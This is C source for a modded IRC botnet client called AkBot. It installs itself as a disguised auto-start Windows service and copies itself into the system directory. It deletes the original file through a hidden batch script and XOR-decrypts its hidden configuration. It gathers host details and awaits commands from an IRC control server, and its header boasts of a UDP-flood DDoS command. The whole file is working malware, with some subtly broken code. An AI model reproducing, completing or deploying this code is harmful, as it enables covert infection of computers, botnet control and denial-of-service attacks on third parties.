/*         AkBot v0.4.1 modded by ReX           */
/* Credits to akbot creater for sending me this.*/
/* SynFLood needs fixing infact...most things needs fixing*/
/* Added mirc INFO and all commands now report to irc E.G*/
/* !DDOSUDP 127.0.0.1 6667 999999 */
/* -(09:28:55)- would not return messages to mirc..now it says*/
/* -(09:28:50)- <ljkihh> UDP-Flooding 127.0.0.1 on port 6667 for 999999 seconds.*/
/* This has been done for most commands(all)*/


#include "include.h"
#include "config.h"

char botid[128];
char server[16][128];
char port[128];
char serverpass[128];
char channel[128];
char chankey[128];
char hostauth[128];
char scanchan[128];
char filename[128];
char svcname[128];
char svclname[128];

int transfers = 0;
char local_ip[16];
char global_ip[16];
char global_host[128];
struct threads thread[512];
struct ircs irc;
bool scan_active = true;
bool socks4_active = false;
bool httpd_active = false;

SERVICE_STATUS svc_status;
SERVICE_STATUS_HANDLE svc_handle;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	LoadDLLs();
	SERVICE_TABLE_ENTRY DispatchTable[] = {
		{ decryptsvc(), svc_start },
		{ 0, 0 }
	};
	if(!StartServiceCtrlDispatcher(DispatchTable)) 
	{
		char sysdir[256];
		char filename2[256];
		SC_HANDLE hSCM;
		SC_HANDLE hService;
		SetErrorMode(SEM_NOGPFAULTERRORBOX);
		decryptconfig();
		syscopy();
		clonecheck();
		GetSystemDirectory(sysdir, sizeof(sysdir));
		_snprintf(filename2, sizeof(filename2), "%s\\%s", sysdir, filename);
		hSCM = OpenSCManager(0, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
		hService = OpenService(hSCM, svcname, SERVICE_ALL_ACCESS);
		if(!hService)
			hService = CreateService(
				hSCM, svcname, svclname,
				SERVICE_ALL_ACCESS,
				SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
				SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
				filename2,
				0, 0, 0, 0, 0);
		if(!hService)
			return 0;
		if(!StartService(hService, 0, 0))
			return 0;
	}
	return 0;
}	

int numtok(const char *str, char chr)
/* counts tokens in a string, using chr as the delimiter */
{
	int i;
	int tc;
	bool in_tok;
	for(i = 0, tc = 0, in_tok = false; str[i] != '\0'; i++)
	{
		if(in_tok && str[i] == chr)
			in_tok = false;
		else if(!in_tok && str[i] != chr)
		{
			in_tok = true;
			tc++;
		}
	}
	return tc;
}

int rrand(int min, int max)
/* easier way of using rand() */
{
	if(min == max)
		return min;
	return rand() % (max - min + 1) + min;
}

int cpuspeed()
/* gets cpu speed */
{
	unsigned __int64 startcycle;
	unsigned __int64 speed;
	unsigned __int64 num;
	unsigned __int64 num2;
	startcycle = cyclecount();
	Sleep(1000);
	speed = ((cyclecount() - startcycle) / 100000) / 10;
	num = speed % 100;
	num2 = 100;
	if(num < 80)
		num2 = 75;
	if(num < 71)
		num2 = 66;
	if(num < 55)
		num2 = 50;
	if(num < 38)
		num2 = 33;
	if(num < 30)
		num2 = 25;
	if(num < 10)
		num2 = 0;
	speed = (speed - num) + num2;
	return (int)speed;
}

unsigned long resolvehost(const char *host)
/* resolves a hostname to a ip address */
{
	struct hostent *he;
	if(!(he = gethostbyname(host)))
		return 0;
	return (*(struct in_addr *)he->h_addr).s_addr;
}

#pragma warning(disable : 4035)
unsigned __int64 cyclecount()
/* gets cpu cycle count */
{
	__asm
	{
		_emit 0x0F;
		_emit 0x31;
	}
}
#pragma warning(default : 4035)

char *gettok(const char *str, int tok, char chr)
/* gets a token from a string, using chr as the delimiter */
{
	int i;
	int l;
	int t;
	int tc;
	bool in_tok;
	char s[32][256];
	char *p;
	for(i = 0, l = 0, t = 0, tc = 0, in_tok = false; str[i] != '\0' && t < 32; i++)
	{
		if(in_tok && str[i] == chr)
		{
			in_tok = false;
			s[t][l] = '\0';
		}
		else if(!in_tok && str[i] != chr)
		{
			in_tok = true;
			tc++;
			if(tc > 1)
				t++;
			l = 0;
			s[t][l++] = str[i];
		}
		else if(in_tok && str[i] != chr)
			s[t][l++] = str[i];
	}
	s[t][l] = '\0';
	p = s[tok-1];
	return p;
}

char *resolveip(unsigned long ip)
/* resolves an ip to a hostname */
{
	struct hostent *he;
	if(!(he = gethostbyaddr((char *)&ip, 4, AF_INET)))
		return 0;
	return he->h_name;
}

char *localip(SOCKET sock)
/* gets the local ip address of the system */
{
	int sas;
	char *local = (char *)malloc(16);
	struct sockaddr sa;
	sas = sizeof(sa);
	getsockname(sock, &sa, &sas);
	_snprintf(local, 16, "%d.%d.%d.%d", (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5]);
	return local;
}

char *sysinfo()
/* gets general system information */
{
	unsigned long total;
	char szBuffer[MAX_COMPUTERNAME_LENGTH+1];
	char os2[128];
	char sysdir[256];
	char *szCompname;
	char *os;
	char *buf = (char *)malloc(256);
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;
	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
	TCHAR szUserName[21];
	DWORD dwUserSize = sizeof(szUserName);
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GlobalMemoryStatus(&memstat);
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);
	if(verinfo.dwMajorVersion == 4 && !verinfo.dwMinorVersion)
	{
		if(verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
			os = "95";
		else if(verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
			os = "NT";
	}
	else if(verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10)
		os = "98";
	else if(verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90)
		os = "ME";
	else if(verinfo.dwMajorVersion == 5 && !verinfo.dwMinorVersion)
		os = "2000";
	else if(verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1)
		os = "XP";
	else
		os = "???";
	if(verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0])
	{
		_snprintf(os2, sizeof(os2), "%s (%s)", os, verinfo.szCSDVersion);
		os = os2;
	}
	total = GetTickCount() / 1000;
	GetComputerName(szBuffer, &dwNameSize);
	szCompname = szBuffer;
	GetUserName(szUserName, &dwUserSize);
	_snprintf(buf, 256, "OS: Windows %s (%d.%d - %d), CPU: %dMHz, RAM: %d/%dMB free, box: %s, user: %s, sysdir: %s, uptime: %lud %luh %lum",
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber,
		cpuspeed(), memstat.dwAvailPhys / 1048576, memstat.dwTotalPhys / 1048576,
		szCompname, szUserName, sysdir, total / 86400, (total % 86400) / 3600, (total % 86400 % 3600) / 60);
	return buf;
}

char *netinfo()
/* gets general network information */
{
	char ctype[8];
	char cname[128];
	char *buf = (char *)malloc(256);
    if(INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM)
		strncpy(ctype, "dial-up", sizeof(ctype));
	else
		strncpy(ctype, "LAN", sizeof(ctype));
	_snprintf(buf, 256, "connection type: %s (%s), IP: %s, connected from: %s (%s)", ctype, cname, local_ip, global_ip, global_host);
	return buf;
}

char *decryptsvc()
/* decrypts svcname */
{
	char *buf = (char *)malloc(128);
	decrypt(buf, 128, svcname, cryptkey);
	return buf;
}

bool isip(const char *address)
/* returns true if it is an ip and false if it isn't */
{
	int a;
	int b;
	int c;
	int d;
	sscanf(address, "%d.%d.%d.%d", &a, &b, &c, &d);
	if(a >= 0 && a <= 255)
	{
		if(b >= 0 && b <= 255)
		{
			if(c >= 0 && c <= 255)
			{
				if(d >= 0 && d <= 255)
					return true;
			}
		}
	}
	return false;
}

void syscopy()
/* copy file to the system directory and melt original file */
{
	char filename1[256];
	char filename2[256];
	char sysdir[256];
	GetModuleFileName(GetModuleHandle(0), filename1, sizeof(filename1));
	GetSystemDirectory(sysdir, sizeof(sysdir));
	_snprintf(filename2, sizeof(filename2), "%s\\%s", sysdir, filename);
	if(stricmp(filename1, filename2))
	{
	 	while(!CopyFile(filename1, filename2, FALSE))
	 		Sleep(2000);
		SetFileAttributes(filename2, FILE_ATTRIBUTE_SYSTEM);
		ShellExecute(0, "open", filename2, 0, 0, SW_HIDE);
		uninstall();
	}
}

void clonecheck()
/* check if it's already running */
{
	int copies;
	char filename2[256];
	char sysdir[256];
	HANDLE psnap;
	PROCESSENTRY32 pe32;
	GetSystemDirectory(sysdir, sizeof(sysdir));
	_snprintf(filename2, sizeof(filename2), "%s\\%s", sysdir, filename);
	copies = 0;
	psnap = CreateToolhelp32Snapshot(2, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);
	Process32First(psnap, &pe32);
	do
	{
		if(!stricmp(filename2, pe32.szExeFile))
			copies++;
	}
	while(Process32Next(psnap, &pe32));
	CloseHandle(psnap);
	if(copies > 1)
		exit(0);
}

void uninstall()
/* remove the executable and delete the service */
{
	unsigned long r;
	char filename1[256];
	char filename2[256];
	char batfile[256];
	char sysdir[256];
	char tempdir[256];
	char fbuf[1024];
	HANDLE f;
	SC_HANDLE hSCM;
	SC_HANDLE hService;
	GetModuleFileName(GetModuleHandle(0), filename1, sizeof(filename1));
	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetTempPath(sizeof(tempdir), tempdir);
	_snprintf(filename2, sizeof(filename2), "%s\\%s", sysdir, filename);
	_snprintf(batfile, sizeof(filename2), "%suninstall.bat", tempdir);
	if(!stricmp(filename1, filename2))
	{
		SetFileAttributes(filename1, FILE_ATTRIBUTE_NORMAL);
		hSCM = OpenSCManager(0, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
		hService = OpenService(hSCM, svcname, SERVICE_ALL_ACCESS);
		DeleteService(hService);
	}
	_snprintf(fbuf, sizeof(fbuf), "@echo off\r\n"
		":1\r\n"
		"del \"%s\"\r\n"
		"if exist \"%s\" goto 1\r\n"
		"del \"%s\"\r\n",
		filename1, filename1, batfile);
	f = CreateFile(batfile, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
	WriteFile(f, fbuf, strlen(fbuf), &r, 0);
	CloseHandle(f);
	ShellExecute(0, "open", batfile, 0, 0, SW_HIDE);
	exit(0);
}

void decryptconfig()
/* decrypt the settings */
{
	int i;
	decrypt(botid, sizeof(botid), e_botid, cryptkey);
	decrypt(port, sizeof(port), e_port, cryptkey);
	decrypt(serverpass, sizeof(serverpass), e_serverpass, cryptkey);
	decrypt(channel, sizeof(channel), e_channel, cryptkey);
	decrypt(chankey, sizeof(chankey), e_chankey, cryptkey);
	decrypt(hostauth, sizeof(hostauth), e_hostauth, cryptkey);
	decrypt(scanchan, sizeof(scanchan), e_scanchan, cryptkey);
	decrypt(filename, sizeof(filename), e_filename, cryptkey);
	decrypt(svcname, sizeof(svclname), e_svcname, cryptkey);
	decrypt(svclname, sizeof(svclname), e_svclname, cryptkey);
	for(i = 0; e_server[i][0]; i++)
		decrypt(server[i], sizeof(server[i]), e_server[i], cryptkey);
	server[i][0] = 0;
}

void decrypt(char *buf, int bufsiz, const char *str, const char *key)
/* decrypts a string with XOR encryption and stores the output in buf */
{
	int x;
	int i;
	int k;
	int keylen = strlen(key);
	unsigned char len = str[0];
	for(x = 0; x < len; x++)
		buf[x] = str[x+1];
	for(k = 0; k < keylen; k++)
	{
		for(i = 0; i < len; i++)
		{
			if(i >= bufsiz)
				break;
			buf[i] ^= key[k];
		}
	}
	buf[len] = '\0';
}

void encrypt(char *buf, int bufsiz, const char *str, const char *key)
/* encrypts a string with XOR encryption and stores the output in buf */
{
	int i;
	int k;
	int keylen = strlen(key);
	unsigned char len = strlen(str);
	buf[0] = len;
	strncpy(buf + 1, str, bufsiz);
	for(k = 0; k < keylen; k++)
	{
		for(i = 1; i <= len; i++)
		{
			if(i >= bufsiz)
				break;
			buf[i] ^= key[k];
		}
	}
}

void svc_main()
/* main function */
{
	int nt;
	int tok;
	int len;
	char recvbuf[4096];
	char line[512];
	char line2[512];
	WSADATA wsa;
	SetErrorMode(SEM_NOGPFAULTERRORBOX);
	decryptconfig();
	srand(GetTickCount());
	syscopy();
	clonecheck();
	clearthreadall();
	memset(local_ip, 0, sizeof(local_ip));
	memset(global_ip, 0, sizeof(global_ip));
	memset(global_host, 0, sizeof(global_host));
	memset(line2, 0, sizeof(line2));
	if(WSAStartup(MAKEWORD(2, 2), &wsa))
		return;
	netinfo();
	while(!irc_connect())
		Sleep(5000);
	while(1)
	{
		if((len = recv(irc.sock, recvbuf, sizeof(recvbuf), 0)) <= 0)
		{
			Sleep(5000);
			while(!irc_connect())
				Sleep(5000);
			continue;
		}
		recvbuf[len] = '\0';
		nt = numtok(recvbuf, '\n');
		for(tok = 0; tok < nt; tok++)
		{
			strncpy(line, gettok(recvbuf, tok + 1, '\n'), sizeof(line));
			if(line2[0])
			{
				_snprintf(line, sizeof(line), "%s%s", line2, line);
				memset(line2, 0, sizeof(line2));
			}
			if(line[strlen(line)-1] != '\r')
			{
				strncpy(line2, line, sizeof(line2));
				break;
			}
			line[strlen(line)-1] = '\0';
			irc_parse(line);
		}
	}
}

void svc_ctrlhandler(unsigned long opcode)
/* ctrl handler for the service */
{
	switch(opcode)
	{
		case SERVICE_CONTROL_PAUSE:
			svc_status.dwCurrentState = SERVICE_PAUSED;
			break;
		case SERVICE_CONTROL_CONTINUE:
			svc_status.dwCurrentState = SERVICE_RUNNING;
			break;
		case SERVICE_CONTROL_STOP:
			svc_status.dwWin32ExitCode = 0;
			svc_status.dwCurrentState = SERVICE_STOPPED;
			svc_status.dwCheckPoint = 0;
			svc_status.dwWaitHint = 0;
			SetServiceStatus(svc_handle, &svc_status);
			return;
		case SERVICE_CONTROL_INTERROGATE:
			break;
		default:
			break;
	}
	SetServiceStatus(svc_handle,  &svc_status);
	return; 
}

void WINAPI svc_start(DWORD argc, LPTSTR *argv)
/* sets the service up */
{
	svc_status.dwServiceType = SERVICE_WIN32;
	svc_status.dwCurrentState = SERVICE_START_PENDING;
	svc_status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;
	svc_status.dwWin32ExitCode = 0;
	svc_status.dwServiceSpecificExitCode = 0;
	svc_status.dwCheckPoint = 0;
	svc_status.dwWaitHint = 0;
	svc_handle = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)svc_ctrlhandler);
	svc_status.dwCurrentState = SERVICE_RUNNING;
	svc_status.dwCheckPoint = 0;
	svc_status.dwWaitHint = 0;
	SetServiceStatus(svc_handle, &svc_status);
	svc_main();
}